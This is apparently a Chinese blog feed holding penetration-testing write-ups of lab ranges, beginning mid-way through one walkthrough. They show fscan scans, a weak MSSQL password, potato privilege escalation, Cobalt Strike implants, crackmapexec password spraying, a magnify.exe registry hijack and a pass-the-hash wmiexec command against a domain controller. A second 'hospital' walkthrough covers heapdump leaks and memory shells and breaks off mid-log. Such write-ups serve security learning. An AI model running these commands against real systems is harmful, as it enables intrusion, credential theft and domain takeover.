20000,20720,21000,21501,21502,28018,20880</span><br><span class="hljs-string">[*] 开始信息扫描...</span><br><span class="hljs-string">[*] 最终有效主机数量: 1</span><br><span class="hljs-string">[*] 共解析 218 个有效端口</span><br><span class="hljs-string">[+] 端口开放 39.99.153.41:135</span><br><span class="hljs-string">[+] 端口开放 39.99.153.41:80</span><br><span class="hljs-string">[+] 端口开放 39.99.153.41:139</span><br><span class="hljs-string">[+] 端口开放 39.99.153.41:1433</span><br><span class="hljs-string">[+] 存活端口数量: 4</span><br><span class="hljs-string">[*] 开始漏洞扫描...</span><br><span class="hljs-string">[*] 网站标题 http://39.99.153.41       状态码:200 长度:703    标题:IIS Windows Server</span><br><span class="hljs-string">[*] NetInfo</span><br><span class="hljs-string">[*] 39.99.153.41</span><br><span class="hljs-string">   [-&gt;] WIN-WEB</span><br><span class="hljs-string">   [-&gt;] 172.22.8.18</span><br><span class="hljs-string">   [-&gt;] 2001:0:348b:fb58:3cf4:1774:d89c:66d6</span><br><span class="hljs-string">[!] 扫描错误 39.99.153.41:139 - netbios error</span><br><span class="hljs-string">[+] MSSQL 39.99.153.41:1433:sa 1qaz!QAZ</span><br><span class="hljs-string">[+] 扫描已完成: 4/4</span><br><span class="hljs-string">[*] 扫描结束,耗时: 15.6297851s</span><br></code></pre></td></tr></table></figure><p>sa 1qaz!QAZ 发现账号密码</p><p>mdut直接连接</p><p><img src="/../Tsclient/1756632361696-21.png" alt="img"></p><p>尝试上传土豆提高权限到sysytem</p><p><img src="/../Tsclient/1756632361677-1.png" alt="img"></p><p>传cs马</p><p><img src="/../Tsclient/1756632361677-2.png" alt="img"></p><p>甜土豆上线system用户</p><p><img src="/../Tsclient/1756632361677-3.png" alt="img"></p><p>拿到第一个flag</p><h1 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h1><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs MATLAB">C:\Users\Public\FScan_2<span class="hljs-number">.0</span><span class="hljs-number">.1</span>_windows_x64.exe.exe -h <span class="hljs-number">172.22</span><span class="hljs-number">.8</span><span class="hljs-number">.18</span>/<span class="hljs-number">24</span> <br>┌──────────────────────────────────────────────┐<br>│    ___                              _        │<br>│   / _ \     ___  ___ _ __ __ _  ___| | __    │<br>│  / /_\/____/ __|/ __| <span class="hljs-string">&#x27;__/ _` |/ __| |/ /    │</span><br><span class="hljs-string">│ / /_\\_____\__ \ (__| | | (_| | (__|   &lt;     │</span><br><span class="hljs-string">│ \____/     |___/\___|_|  \__,_|\___|_|\_\    │</span><br><span class="hljs-string">└──────────────────────────────────────────────┘</span><br><span class="hljs-string">      Fscan Version: 2.0.1</span><br><span class="hljs-string"></span><br><span class="hljs-string">[2.2s]     已选择服务扫描模式</span><br><span class="hljs-string">[2.2s]     开始信息扫描</span><br><span class="hljs-string">[2.2s]     CIDR范围: 172.22.8.0-172.22.8.255</span><br><span class="hljs-string">[2.2s]     generate_ip_range_full</span><br><span class="hljs-string">[2.2s]     解析CIDR 172.22.8.18/24 -&gt; IP范围 172.22.8.0-172.22.8.255</span><br><span class="hljs-string">[2.2s]     最终有效主机数量: 256</span><br><span class="hljs-string">[2.2s]     开始主机扫描</span><br><span class="hljs-string">[2.2s]     使用服务插件: activemq, cassandra, elasticsearch, findnet, ftp, imap, kafka, ldap, memcached, modbus, mongodb, ms17010, mssql, mysql, neo4j, netbios, oracle, pop3, postgres, rabbitmq, rdp, redis, rsync, smb, smb2, smbghost, smtp, snmp, ssh, telnet, vnc, webpoc, webtitle</span><br><span class="hljs-string">[2.2s] [*] 目标 172.22.8.15     存活 (ICMP)</span><br><span class="hljs-string">[2.2s] [*] 目标 172.22.8.18     存活 (ICMP)</span><br><span class="hljs-string">[2.2s] [*] 目标 172.22.8.31     存活 (ICMP)</span><br><span class="hljs-string">[2.2s] [*] 目标 172.22.8.46     存活 (ICMP)                                       C:\Users\Public\fscan.exe -h 172.22.8.18/24[5.2s]     存活主机数量: 424 </span><br><span class="hljs-string">[5.2s]     有效端口数量: 233</span><br><span class="hljs-string">[5.2s] [*] 端口开放 172.22.8.15:445</span><br><span class="hljs-string">[5.2s] [*] 端口开放 172.22.8.15:389</span><br><span class="hljs-string">[5.2s] [*] 端口开放 172.22.8.15:139</span><br><span class="hljs-string">[5.2s] [*] 端口开放 172.22.8.31:135</span><br><span class="hljs-string">[5.2s] [*] 端口开放 172.22.8.18:1433</span><br><span class="hljs-string">[5.2s] [*] 端口开放 172.22.8.15:135</span><br><span class="hljs-string">[5.2s] [*] 端口开放 172.22.8.18:445</span><br><span class="hljs-string">[5.2s] [*] 端口开放 172.22.8.15:88</span><br><span class="hljs-string">[5.2s] [*] 端口开放 172.22.8.31:445</span><br><span class="hljs-string">[5.2s] [*] 端口开放 172.22.8.31:139</span><br><span class="hljs-string">[5.2s] [*] 端口开放 172.22.8.18:135</span><br><span class="hljs-string">[5.2s] [*] 端口开放 172.22.8.18:139</span><br><span class="hljs-string">[5.2s] [*] 端口开放 172.22.8.18:80                       C:\Users\Public\fscan.exe -h 172.22.8.18/24[6.2s] [*] 端口开放 172.22.8.46:445</span><br><span class="hljs-string">[6.2s] [*] 端口开放 172.22.8.46:139</span><br><span class="hljs-string">[6.2s] [*] 端口开放 172.22.8.46:135</span><br><span class="hljs-string">[6.2s] [*] 端口开放 172.22.8.46:80                 C:\Users\Public\FScan_2.0.1_windows_x64.exe.exe -h 172.22.8.18/24 [9.3s]     扫描完成, 发现 17 个开放端口</span><br><span class="hljs-string">[9.3s]     存活端口数量: 17</span><br><span class="hljs-string">[9.3s]     开始漏洞扫描</span><br><span class="hljs-string">[9.3s] [*] NetInfo 扫描结果</span><br><span class="hljs-string">目标主机: 172.22.8.18</span><br><span class="hljs-string">主机名: WIN-WEB</span><br><span class="hljs-string">发现的网络接口:</span><br><span class="hljs-string">   IPv4地址:</span><br><span class="hljs-string">      └─ 172.22.8.18</span><br><span class="hljs-string">   IPv6地址:</span><br><span class="hljs-string">      └─ 2001:0:348b:fb58:20d1:213:d89c:7db3</span><br><span class="hljs-string">[9.3s] [*] NetInfo 扫描结果</span><br><span class="hljs-string">目标主机: 172.22.8.31</span><br><span class="hljs-string">主机名: WIN19-CLIENT</span><br><span class="hljs-string">发现的网络接口:</span><br><span class="hljs-string">   IPv4地址:</span><br><span class="hljs-string">      └─ 172.22.8.31</span><br><span class="hljs-string">[9.3s] [*] NetInfo 扫描结果</span><br><span class="hljs-string">目标主机: 172.22.8.15</span><br><span class="hljs-string">主机名: DC01</span><br><span class="hljs-string">发现的网络接口:</span><br><span class="hljs-string">   IPv4地址:</span><br><span class="hljs-string">      └─ 172.22.8.15</span><br><span class="hljs-string">[9.3s] [*] NetInfo 扫描结果</span><br><span class="hljs-string">目标主机: 172.22.8.46</span><br><span class="hljs-string">主机名: WIN2016</span><br><span class="hljs-string">发现的网络接口:</span><br><span class="hljs-string">   IPv4地址:</span><br><span class="hljs-string">      └─ 172.22.8.46</span><br><span class="hljs-string">[9.3s] [*] 网站标题 http://172.22.8.18        状态码:200 长度:703    标题:IIS Windows Server</span><br><span class="hljs-string">[9.3s] [+] NetBios 172.22.8.31     XIAORANG\WIN19-CLIENT         </span><br><span class="hljs-string">[9.3s] [+] NetBios 172.22.8.15     DC:XIAORANG\DC01           </span><br><span class="hljs-string">[9.3s] [+] NetBios 172.22.8.46     WIN2016.xiaorang.lab                Windows Server 2016 Datacenter 14393</span><br><span class="hljs-string">[9.4s]     POC加载完成: 总共387个，成功387个，失败0个</span><br><span class="hljs-string">[9.4s] [*] 网站标题 http://172.22.8.46        状态码:200 长度:703    标题:IIS Windows Server</span><br><span class="hljs-string">[16.4s] [+C:\Users\Public\fscan.exe -h 172.22.8.18/24</span><br></code></pre></td></tr></table></figure><p>内网扫一遍</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs MATLAB">net user<br></code></pre></td></tr></table></figure><p>发现有一个john用户</p><p><img src="/../Tsclient/1756632361678-4.png" alt="img"></p><p>注入让john用户上线</p><p><img src="/../Tsclient/1756632361678-5.png" alt="img"></p><p>挂载</p><p><img src="/../Tsclient/1756632361678-6.png" alt="img"></p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs MATLAB">xiaorang.lab\Aldrich:Ald@rLMWuy7Z!#<br>proxychains4 crackmapexec smb <span class="hljs-number">172.22</span><span class="hljs-number">.8</span><span class="hljs-number">.0</span>/<span class="hljs-number">24</span> -u <span class="hljs-string">&#x27;Aldrich&#x27;</span> -p <span class="hljs-string">&#x27;Ald@rLMWuy7Z!#&#x27;</span> -d xiaorang.lab <span class="hljs-number">2</span>&gt;/dev/null<br></code></pre></td></tr></table></figure><p><img src="/../Tsclient/1756632361678-7.png" alt="img"></p><p><img src="/../Tsclient/1756632361678-8.png" alt="img"></p><p>修改密码成功</p><p><img src="/../Tsclient/1756632361678-9.png" alt="img"></p><p>登录46成功（注意代理</p><p><img src="/../Tsclient/1756632361678-10.png" alt="img"></p><p>可以修改注册表</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs MATLAB">reg add <span class="hljs-string">&quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\magnify.exe&quot;</span> /v Debugger /t REG_SZ /d <span class="hljs-string">&quot;C:\Windows\System32\cmd.exe&quot;</span><br></code></pre></td></tr></table></figure><p>劫持cmd</p><p><img src="/../Tsclient/1756632361678-11.png" alt="img"></p><p>在锁定的放大镜的地方拿到system权限</p><p><img src="/../Tsclient/1756632361678-12.png" alt="img"></p><p><img src="/../Tsclient/1756632361678-13.png" alt="img"></p><p>传转发入口机流量的转发上线监听器，让46机子的system上线了</p><p><img src="/../Tsclient/1756632361678-14.png" alt="img"></p><p><img src="/../Tsclient/1756632361678-15.png" alt="img"></p><p>拿到flag2</p><h1 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h1><p>查看域的信息</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs MATLAB">shell net group <span class="hljs-string">&quot;domain admins&quot;</span> /domain<br></code></pre></td></tr></table></figure><p><img src="/../Tsclient/1756632361678-16.png" alt="img"></p><p>发现本机是域管理员</p><p>点击抓取本机明文密码，然后查看hash值</p><p><img src="/../Tsclient/1756632361678-17.png" alt="img"></p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs MATLAB"><span class="hljs-number">83</span>d29a49096bf96d0ca1e1e5531fb65b<br>proxychains4 python wmiexec.py -hashes :<span class="hljs-number">83</span>d29a49096bf96d0ca1e1e5531fb65b xiaorang.lab/WIN2016\$@<span class="hljs-number">172.22</span><span class="hljs-number">.8</span><span class="hljs-number">.15</span> -codec gbk<br></code></pre></td></tr></table></figure><p><img src="/../Tsclient/1756632361678-18.png" alt="img"></p><p>拿到shell之后读文件</p><p><img src="/../Tsclient/1756632361679-19.png" alt="img"></p><p><img src="/../Tsclient/1756632361679-20.png" alt="img"></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结:"></a>总结:</h1><p>整理一下思路:首先是入口机（18号机）存在一个mssql的弱口令登录，直接用mdut工具登录后拿到一个低权限的shell，然后用甜土豆提权到system。然后传cs马，利用甜土豆触发cs马，让system上线cs，得到一个稳定持久的权限，方便进行后续的渗透。</p><p>然后是net user发现了一个john用户，通过进程注入，使其上线cs，发现存在一个挂载的文件夹，里面发现了一对域的账密，通过crackmapexec的密码喷洒去连接内网的机子，利用smbpassword修改密码,登录上46号机，发现权限不够，同时为了维护权限，利用18号机子的可以监听到46号机子的特性，传了一个流量转发上线的cs马，然后打了一个镜像劫持，修改注册表，让放大镜变成cmd，在锁定在状态下获得了system权限，同时46号机子的system上线cs。</p><p>46号机子是域管理员，利用它的哈希可以拿到DC，15号机子的shell，最后读flag就好了</p>]]></content>
    
    
    <categories>
      
      <category>渗透</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>春秋云镜之hospital</title>
    <link href="/2025/08/20/%E6%B8%97%E9%80%8F/hospital/"/>
    <url>/2025/08/20/%E6%B8%97%E9%80%8F/hospital/</url>
    
    <content type="html"><![CDATA[<h3 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h3><p>fscan扫描</p><p><img src="/../hospital/1756616305171-10.png" alt="img"></p><p>存在actuator泄露</p><p><img src="/../hospital/1756616305162-1.png" alt="img"></p><p>下载下来，然后解密</p><p><img src="/../hospital/1756616305162-2.png" alt="img"></p><p>然后利用密钥注入内存马</p><p><img src="/../hospital/1756616305163-3.png" alt="img"></p><h3 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br></pre></td><td class="code"><pre><code class="hljs Bash">fscan -h 172.30.12.5/24<br><br>   ___                              _    <br>  / _ \     ___  ___ _ __ __ _  ___| | __ <br> / /_\/____/ __|/ __| <span class="hljs-string">&#x27;__/ _` |/ __| |/ /</span><br><span class="hljs-string">/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;    </span><br><span class="hljs-string">\____/     |___/\___|_|  \__,_|\___|_|\_\   </span><br><span class="hljs-string">                     fscan version: 1.8.4</span><br><span class="hljs-string">start infoscan</span><br><span class="hljs-string">(icmp) Target 172.30.12.5     is alive</span><br><span class="hljs-string">(icmp) Target 172.30.12.6     is alive</span><br><span class="hljs-string">(icmp) Target 172.30.12.236   is alive</span><br><span class="hljs-string">[*] Icmp alive hosts len is: 3</span><br><span class="hljs-string">172.30.12.6:445 open</span><br><span class="hljs-string">172.30.12.6:139 open</span><br><span class="hljs-string">172.30.12.236:22 open</span><br><span class="hljs-string">172.30.12.5:22 open</span><br><span class="hljs-string">172.30.12.6:8848 open</span><br><span class="hljs-string">172.30.12.236:8080 open</span><br><span class="hljs-string">172.30.12.5:8080 open</span><br><span class="hljs-string">172.30.12.6:135 open</span><br><span class="hljs-string">172.30.12.236:8009 open</span><br><span class="hljs-string">[*] alive ports len is: 9</span><br><span class="hljs-string">start vulscan</span><br><span class="hljs-string">[*] NetBios 172.30.12.6     WORKGROUP\SERVER02            </span><br><span class="hljs-string">[*] NetInfo </span><br><span class="hljs-string">[*]172.30.12.6</span><br><span class="hljs-string">   [-&gt;]Server02</span><br><span class="hljs-string">   [-&gt;]172.30.12.6</span><br><span class="hljs-string">[*] WebTitle http://172.30.12.5:8080   code:302 len:0      title:None 跳转url: http://172.30.12.5:8080/login;jsessionid=2261EB3268EC9362C18EA7EAD68503FD</span><br><span class="hljs-string">[*] WebTitle http://172.30.12.5:8080/login;jsessionid=2261EB3268EC9362C18EA7EAD68503FD code:200 len:2005   title:医疗管理后台</span><br><span class="hljs-string">[*] WebTitle http://172.30.12.236:8080 code:200 len:3964   title:医院后台管理平台</span><br><span class="hljs-string">[*] WebTitle http://172.30.12.6:8848   code:404 len:431    title:HTTP Status 404 – Not Found</span><br><span class="hljs-string">[+] PocScan http://172.30.12.5:8080 poc-yaml-spring-actuator-heapdump-file </span><br><span class="hljs-string">[+] PocScan http://172.30.12.6:8848 poc-yaml-alibaba-nacos </span><br><span class="hljs-string">[+] PocScan http://172.30.12.6:8848 poc-yaml-alibaba-nacos-v1-auth-bypass </span><br><span class="hljs-string">root@web01:~# ./fscan -h 172.30.12.5</span><br><span class="hljs-string">┌──────────────────────────────────────────────┐</span><br><span class="hljs-string">│    ___                              _        │</span><br><span class="hljs-string">│   / _ \     ___  ___ _ __ __ _  ___| | __    │</span><br><span class="hljs-string">│  / /_\/____/ __|/ __| &#x27;</span>__/ _` |/ __| |/ /    │<br>│ / /_\\_____\__ \ (__| | | (_| | (__|   &lt;     │<br>│ \____/     |___/\___|_|  \__,_|\___|_|\_\    │<br>└──────────────────────────────────────────────┘<br>      Fscan Version: 2.0.0<br><br>[2025-08-04 23:36:02] [INFO] 暴力破解线程数: 1<br>[2025-08-04 23:36:02] [INFO] 开始信息扫描<br>[2025-08-04 23:36:02] [INFO] 最终有效主机数量: 1<br>[2025-08-04 23:36:02] [INFO] 开始主机扫描<br>[2025-08-04 23:36:02] [INFO] 有效端口数量: 233<br>[2025-08-04 23:36:02] [SUCCESS] 端口开放 172.30.12.5:8080<br>[2025-08-04 23:36:02] [SUCCESS] 端口开放 172.30.12.5:22<br>[2025-08-04 23:36:02] [SUCCESS] 服务识别 172.30.12.5:22 =&gt; [ssh] 版本:8.2p1 Ubuntu 4ubuntu0.9 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.9.]<br>[2025-08-04 23:36:07] [SUCCESS] 服务识别 172.30.12.5:8080 =&gt; [http]<br>[2025-08-04 23:36:07] [INFO] 存活端口数量: 2<br>[2025-08-04 23:36:07] [INFO] 开始漏洞扫描<br>[2025-08-04 23:36:07] [INFO] 加载的插件: ssh, webpoc, webtitle<br>[2025-08-04 23:36:08] [SUCCESS] 网站标题 http://172.30.12.5:8080   状态码:302 长度:0      标题:无标题 重定向地址: http://172.30.12.5:8080/login;jsessionid=3B63A3BF0F71CA4D7EAF33C45987584E<br>[2025-08-04 23:36:08] [SUCCESS] 网站标题 http://172.30.12.5:8080/login;jsessionid=3B63A3BF0F71CA4D7EAF33C45987584E 状态码:200 长度:2005   标题:医疗管理后台<br>[2025-08-04 23:36:08] [SUCCESS] 目标: http://172.30.12.5:8080<br>  漏洞类型: poc-yaml-spring-actuator-heapdump-file<br>  漏洞名称: <br>  详细信息:<br>        author:AgeloVito<br>        links:https://www.cnblogs.com/wyb628/p/8567610.html<br>^C<br>root@web01:~# ./fscan -h 172.30.12.5/24<br>┌──────────────────────────────────────────────┐<br>│    ___                              _        │<br>│   / _ \     ___  ___ _ __ __ _  ___| | __    │<br>│  / /_\/____/ __|/ __| <span class="hljs-string">&#x27;__/ _` |/ __| |/ /    │</span><br><span class="hljs-string">│ / /_\\_____\__ \ (__| | | (_| | (__|   &lt;     │</span><br><span class="hljs-string">│ \____/     |___/\___|_|  \__,_|\___|_|\_\    │</span><br><span class="hljs-string">└──────────────────────────────────────────────┘</span><br><span class="hljs-string">      Fscan Version: 2.0.0</span><br><span class="hljs-string"></span><br><span class="hljs-string">[2025-08-04 23:41:24] [INFO] 暴力破解线程数: 1</span><br><span class="hljs-string">[2025-08-04 23:41:24] [INFO] 开始信息扫描</span><br><span class="hljs-string">[2025-08-04 23:41:24] [INFO] CIDR范围: 172.30.12.0-172.30.12.255</span><br><span class="hljs-string">[2025-08-04 23:41:24] [INFO] 生成IP范围: 172.30.12.0.%!d(string=172.30.12.255) - %!s(MISSING).%!d(MISSING)</span><br><span class="hljs-string">[2025-08-04 23:41:24] [INFO] 解析CIDR 172.30.12.5/24 -&gt; IP范围 172.30.12.0-172.30.12.255</span><br><span class="hljs-string">[2025-08-04 23:41:24] [INFO] 最终有效主机数量: 256</span><br><span class="hljs-string">[2025-08-04 23:41:24] [INFO] 开始主机扫描</span><br><span class="hljs-string">[2025-08-04 23:41:24] [SUCCESS] 目标 172.30.12.5     存活 (ICMP)</span><br><span class="hljs-string">[2025-08-04 23:41:24] [SUCCESS] 目标 172.30.12.6     存活 (ICMP)</span><br><span class="hljs-string">[2025-08-04 23:41:24] [SUCCESS] 目标 172.30.12.236   存活 (ICMP)</span><br><span class="hljs-string">[2025-08-04 23:41:27] [INFO] 存活主机数量: 3</span><br><span class="hljs-string">[2025-08-04 23:41:27] [INFO] 有效端口数量: 233</span><br><span class="hljs-string">[2025-08-04 23:41:27] [SUCCESS] 端口开放 172.30.12.236:22</span><br><span class="hljs-string">[2025-08-04 23:41:27] [SUCCESS] 端口开放 172.30.12.6:445</span><br><span class="hljs-string">[2025-08-04 23:41:27] [SUCCESS] 端口开放 172.30.12.6:139</span><br><span class="hljs-string">[2025-08-04 23:41:27] [SUCCESS] 端口开放 172.30.12.5:22</span><br><span class="hljs-string">[2025-08-04 23:41:27] [SUCCESS] 端口开放 172.30.12.6:135</span><br><span class="hljs-string">[2025-08-04 23:41:27] [SUCCESS] 端口开放 172.30.12.236:8009</span><br><span class="hljs-string">[2025-08-04 23:41:27] [SUCCESS] 端口开放 172.30.12.5:8080</span><br><span class="hljs-string">[2025-08-04 23:41:27] [SUCCESS] 端口开放 172.30.12.236:8080</span><br><span class="hljs-string">[2025-08-04 23:41:27] [SUCCESS] 端口开放 172.30.12.6:8848</span><br><span class="hljs-string">[2025-08-04 23:41:27] [SUCCESS] 服务识别 172.30.12.236:22 =&gt; [ssh] 版本:8.2p1 Ubuntu 4ubuntu0.9 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.9.]</span><br><span class="hljs-string">[2025-08-04 23:41:27] [SUCCESS] 服务识别 172.30.12.5:22 =&gt; [ssh] 版本:8.2p1 Ubuntu 4ubuntu0.9 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.9.]</span><br><span class="hljs-string">[2025-08-04 23:41:32] [SUCCESS] 服务识别 172.30.12.6:445 =&gt; </span><br><span class="hljs-string">[2025-08-04 23:41:32] [SUCCESS] 服务识别 172.30.12.6:139 =&gt;  Banner:[.]</span><br><span class="hljs-string">[2025-08-04 23:41:32] [SUCCESS] 服务识别 172.30.12.236:8009 =&gt; </span><br><span class="hljs-string">[2025-08-04 23:41:33] [SUCCESS] 服务识别 172.30.12.5:8080 =&gt; [http]</span><br><span class="hljs-string">[2025-08-04 23:41:33] [SUCCESS] 服务识别 172.30.12.236:8080 =&gt; [http]</span><br><span class="hljs-string">[2025-08-04 23:41:38] [SUCCESS] 服务识别 172.30.12.6:8848 =&gt; [http]</span><br><span class="hljs-string">[2025-08-04 23:42:32] [SUCCESS] 服务识别 172.30.12.6:135 =&gt; </span><br><span class="hljs-string">[2025-08-04 23:42:32] [INFO] 存活端口数量: 9</span><br><span class="hljs-string">[2025-08-04 23:42:32] [INFO] 开始漏洞扫描</span><br><span class="hljs-string">[2025-08-04 23:42:33] [INFO] 加载的插件: findnet, ms17010, netbios, smb, smb2, smbghost, ssh, webpoc, webtitle</span><br><span class="hljs-string">[2025-08-04 23:42:33] [SUCCESS] NetInfo 扫描结果</span><br><span class="hljs-string">目标主机: 172.30.12.6</span><br><span class="hljs-string">主机名: Server02</span><br><span class="hljs-string">发现的网络接口:</span><br><span class="hljs-string">   IPv4地址:</span><br><span class="hljs-string">      └─ 172.30.12.6</span><br><span class="hljs-string">[2025-08-04 23:42:33] [SUCCESS] NetBios 172.30.12.6     WORKGROUP\SERVER02            </span><br><span class="hljs-string">[2025-08-04 23:42:33] [SUCCESS] 网站标题 http://172.30.12.236:8080 状态码:200 长度:3964   标题:医院后台管理平台</span><br><span class="hljs-string">[2025-08-04 23:42:33] [SUCCESS] 网站标题 http://172.30.12.5:8080   状态码:302 长度:0      标题:无标题 重定向地址: http://172.30.12.5:8080/login;jsessionid=42BD587B74C2B58C42238FBB955213F9</span><br><span class="hljs-string">[2025-08-04 23:42:33] [SUCCESS] 网站标题 http://172.30.12.6:8848   状态码:404 长度:431    标题:HTTP Status 404 – Not Found</span><br><span class="hljs-string">[2025-08-04 23:42:33] [SUCCESS] 网站标题 http://172.30.12.5:8080/login;jsessionid=42BD587B74C2B58C42238FBB955213F9 状态码:200 长度:2005   标题:医疗管理后台</span><br><span class="hljs-string">[2025-08-04 23:42:33] [SUCCESS] 目标: http://172.30.12.6:8848</span><br><span class="hljs-string">  漏洞类型: poc-yaml-alibaba-nacos</span><br><span class="hljs-string">  漏洞名称: </span><br><span class="hljs-string">  详细信息:</span><br><span class="hljs-string">        author:AgeloVito</span><br><span class="hljs-string">        links:https://blog.csdn.net/caiqiiqi/article/details/112005424</span><br><span class="hljs-string">[2025-08-04 23:42:33] [SUCCESS] 目标: http://172.30.12.6:8848</span><br><span class="hljs-string">  漏洞类型: poc-yaml-alibaba-nacos-v1-auth-bypass</span><br><span class="hljs-string">  漏洞名称: </span><br><span class="hljs-string">  详细信息:</span><br><span class="hljs-string">        author:kmahyyg(https://github.com/kmahyyg)</span><br><span class="hljs-string">        links:https://github.com/alibaba/nacos/issues/4593</span><br><span class="hljs-string">[2025-08-04 23:42:34] [SUCCESS] 目标: http://172.30.12.5:8080</span><br><span class="hljs-string">  漏洞类型: poc-yaml-spring-actuator-heapdump-file</span><br><span class="hljs-string">  漏洞名称: </span><br><span class="hljs-string">  详细信息:</span><br><span class="hljs-string">        author:AgeloVito</span><br><span class="hljs-string">        links:https://www.cnblogs.com/wyb628/p/8567610.html</span><br><span class="hljs-string">[2025-08-04 